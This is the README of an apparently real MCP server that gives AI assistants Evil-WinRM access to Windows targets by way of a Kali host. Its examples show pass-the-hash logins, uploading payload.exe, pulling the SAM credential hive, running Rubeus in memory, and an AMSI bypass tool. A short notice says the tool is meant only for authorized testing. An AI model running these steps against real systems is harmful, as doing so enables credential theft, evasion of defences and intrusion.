# Evil-WinRM MCP Server

An MCP (Model Context Protocol) server that provides AI assistants with the ability to execute Evil-WinRM commands against Windows targets via SSH to a Kali Linux host.

## Overview

[Evil-WinRM](https://github.com/Hackplayers/evil-winrm) is the ultimate WinRM shell for penetration testing. This MCP server wraps Evil-WinRM to enable AI-assisted Windows post-exploitation and lateral movement tasks.

### Key Features

- **Multiple Authentication Methods** - Password, NTLM hash (Pass-the-Hash), and Kerberos
- **PowerShell Execution** - Run arbitrary PowerShell commands on targets
- **File Transfer** - Upload and download files to/from Windows systems
- **In-Memory Execution** - Load .NET assemblies and DLLs without touching disk
- **AMSI Bypass** - Built-in Bypass-4MSI functionality
- **Service Enumeration** - List services with permission analysis

## Architecture

```
AI Assistant <-> MCP Server <-> SSH <-> Kali Linux <-> Evil-WinRM <-> Windows Target
```

The MCP server runs locally and executes Evil-WinRM commands on a remote Kali Linux host via SSH, which then connects to Windows targets over WinRM (ports 5985/5986).

## Prerequisites

- **Node.js** 18.x or higher
- **Kali Linux** with Evil-WinRM installed (`gem install evil-winrm`)
- **SSH Access** from the MCP server host to Kali Linux
- **Network Access** from Kali to Windows targets (WinRM ports 5985/5986)

## Installation

```bash
# Clone the repository
git clone https://github.com/schwarztim/sec-evil-winrm-mcp.git
cd sec-evil-winrm-mcp

# Install dependencies
npm install

# Build
npm run build
```

## Configuration

### Environment Variables

| Variable | Description | Default |
|----------|-------------|---------|
| `KALI_HOST` | Kali Linux hostname or IP address | `kali` |
| `KALI_USER` | SSH username for Kali | `kali` |
| `SSH_KEY` | Path to SSH private key (optional) | - |
| `EVILWINRM_DEFAULT_PORT` | Default WinRM port | `5985` |

### Claude Desktop Configuration

Add to your Claude Desktop config (`~/.config/Claude/claude_desktop_config.json`):

```json
{
  "mcpServers": {
    "evil-winrm": {
      "command": "node",
      "args": ["/path/to/sec-evil-winrm-mcp/dist/index.js"],
      "env": {
        "KALI_HOST": "your-kali-host",
        "KALI_USER": "kali",
        "SSH_KEY": "/path/to/ssh/key"
      }
    }
  }
}
```

## Available Tools

### Session Management

| Tool | Description |
|------|-------------|
| `evilwinrm_connect` | Configure connection parameters (host, user, password/hash, SSL, Kerberos) |
| `evilwinrm_get_session` | View current session configuration |
| `evilwinrm_clear_session` | Clear session parameters |
| `evilwinrm_test_connection` | Test SSH connectivity to Kali and verify Evil-WinRM installation |

### Command Execution

| Tool | Description |
|------|-------------|
| `evilwinrm_exec` | Execute PowerShell commands on the target |
| `evilwinrm_services` | List Windows services and analyze permissions |

### File Transfer

| Tool | Description |
|------|-------------|
| `evilwinrm_upload` | Upload files from Kali to target |
| `evilwinrm_download` | Download files from target to Kali |

### Advanced Features

| Tool | Description |
|------|-------------|
| `evilwinrm_menu` | Show available Evil-WinRM built-in functions |
| `evilwinrm_dll_loader` | Load DLLs via SMB, local path, or HTTP |
| `evilwinrm_invoke_binary` | Execute .NET assemblies in memory |
| `evilwinrm_bypass_amsi` | Patch AMSI (Antimalware Scan Interface) protections |

## Usage Examples

### Basic Connection with Password

```
1. evilwinrm_connect(host="192.168.1.100", user="administrator", password="P@ssw0rd")
2. evilwinrm_exec(command="whoami /all")
3. evilwinrm_exec(command="Get-Process | Select-Object -First 10")
```

### Pass-the-Hash Attack

```
1. evilwinrm_connect(
     host="192.168.1.100",
     user="administrator",
     hash="aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"
   )
2. evilwinrm_exec(command="hostname")
```

### SSL/HTTPS Connection (Port 5986)

```
1. evilwinrm_connect(
     host="192.168.1.100",
     user="admin",
     password="secret",
     port="5986",
     ssl=true
   )
```

### Kerberos Authentication

```
1. evilwinrm_connect(
     host="dc01.corp.local",
     user="admin",
     password="P@ssw0rd",
     realm="CORP.LOCAL"
   )
```

### File Operations

```
# Upload a file
evilwinrm_upload(local_path="/tmp/payload.exe", remote_path="C:\\Windows\\Temp\\payload.exe")

# Download a file
evilwinrm_download(remote_path="C:\\Windows\\System32\\config\\SAM", local_path="/tmp/SAM")
```

### In-Memory Execution

```
# First, configure with executables path
evilwinrm_connect(
  host="192.168.1.100",
  user="admin",
  password="secret",
  execs_path="/opt/tools/dotnet"
)

# Execute .NET assembly in memory
evilwinrm_invoke_binary(binary_name="Rubeus.exe", arguments="triage")
```

## Security Notice

**This tool is intended for authorized security testing and research only.**

- Always obtain proper written authorization before testing
- Only use against systems you own or have explicit permission to test
- Follow responsible disclosure practices
- Comply with all applicable laws and regulations

Unauthorized access to computer systems is illegal. The authors are not responsible for misuse of this tool.

## References

- [Evil-WinRM GitHub](https://github.com/Hackplayers/evil-winrm)
- [Kali Linux Tools - Evil-WinRM](https://www.kali.org/tools/evil-winrm/)
- [Model Context Protocol](https://modelcontextprotocol.io/)
- [WinRM Documentation](https://docs.microsoft.com/en-us/windows/win32/winrm/portal)

## License

MIT License - see [LICENSE](LICENSE) for details.
